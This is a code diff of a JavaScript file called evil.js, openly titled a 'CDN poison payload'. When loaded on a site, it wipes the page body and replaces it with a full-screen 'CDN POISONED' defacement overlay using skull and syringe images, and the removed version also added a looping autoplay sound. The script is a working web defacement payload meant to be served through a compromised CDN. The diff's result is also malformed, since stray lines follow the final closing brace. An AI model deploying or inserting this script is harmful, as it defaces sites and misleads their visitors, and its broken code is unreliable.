@@ -1,71 +1,80 @@
-// evil.js — HELLSTORM CDN POISON PAYLOAD (GORE PRO)
+// evil.js — CDN POISONED DOM PAYLOAD (Skulls + Syringes Style)
 
 (() => {
   const style = document.createElement('style');
   style.innerHTML = `
-    @keyframes blood {
-      0% { background-position: 0 0; }
-      100% { background-position: 0 100vh; }
-    }
-
-    @keyframes glitch {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.03) rotate(1deg); }
-      100% { transform: scale(1); }
+    @keyframes pulse {
+      0% { transform: scale(1); opacity: 0.9; }
+      50% { transform: scale(1.1); opacity: 1; }
+      100% { transform: scale(1); opacity: 0.9; }
     }
 
     body {
+      background-color: black;
+      color: red;
+      font-family: 'Courier New', monospace;
       margin: 0;
       padding: 0;
-      background: url('https://i.imgur.com/1mYIuQF.png') repeat;
-      animation: blood 15s linear infinite;
-      color: red;
-      font-family: monospace;
-      text-align: center;
-      padding-top: 10vh;
+      overflow: hidden;
     }
 
-    .hellstorm-title {
-      font-size: 48px;
-      text-shadow: 2px 2px black;
-      animation: glitch 1s infinite;
+    .overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.92);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 99999;
+    }
+
+    .title {
+      font-size: 64px;
+      font-weight: bold;
+      color: red;
+      text-shadow: 2px 2px 8px black;
+      animation: pulse 2s infinite;
     }
 
     .subtitle {
-      font-size: 22px;
-      margin-bottom: 20px;
+      font-size: 24px;
+      margin-top: 10px;
     }
 
-    .icon {
-      width: 80px;
-      margin: 10px;
-      filter: drop-shadow(2px 2px 4px black);
-    }
-
-    .gif {
+    .icons {
+      display: flex;
+      gap: 30px;
       margin-top: 30px;
-      border: 2px solid red;
-      box-shadow: 0 0 10px red;
+      animation: pulse 3s infinite;
+    }
+
+    .icons img {
+      width: 80px;
+      height: 80px;
     }
   `;
   document.head.appendChild(style);
 
-  const container = document.createElement("div");
-  container.innerHTML = `
-    <div class="hellstorm-title">💀 CDN POISONED 💀</div>
-    <div class="subtitle">THIS RESOURCE HAS BEEN COMPROMISED</div>
-    <img src="https://cdn-icons-png.flaticon.com/512/2765/2765273.png" class="icon" />
-    <img src="https://media.giphy.com/media/QHE5gWI0QjqF2/giphy.gif" class="gif" width="280" />
+  const overlay = document.createElement("div");
+  overlay.className = "overlay";
+  overlay.innerHTML = `
+    <div class="title">💀 CDN POISONED 💀</div>
+    <div class="subtitle">This resource has been compromised</div>
+    <div class="icons">
+      <img src="https://cdn-icons-png.flaticon.com/512/2765/2765273.png" alt="Skull">
+      <img src="https://cdn-icons-png.flaticon.com/512/4492/4492312.png" alt="Syringe">
+      <img src="https://cdn-icons-png.flaticon.com/512/2765/2765273.png" alt="Skull">
+    </div>
   `;
-  document.body.innerHTML = '';
-  document.body.appendChild(container);
+  document.body.innerHTML = "";
+  document.body.appendChild(overlay);
 
-  // Optional chaos sound — can be commented if not needed
-  const audio = document.createElement('audio');
-  audio.src = 'https://www.myinstants.com/media/sounds/vine-boom.mp3';
-  audio.autoplay = true;
-  audio.loop = true;
-  document.body.appendChild(audio);
+  console.log("☠️ CDN POISON PAYLOAD EXECUTED ☠️");
+})();
+
 
   console.log("💉 HELLSTORM GORE PAYLOAD INJECTED SUCCESSFULLY");
 })();
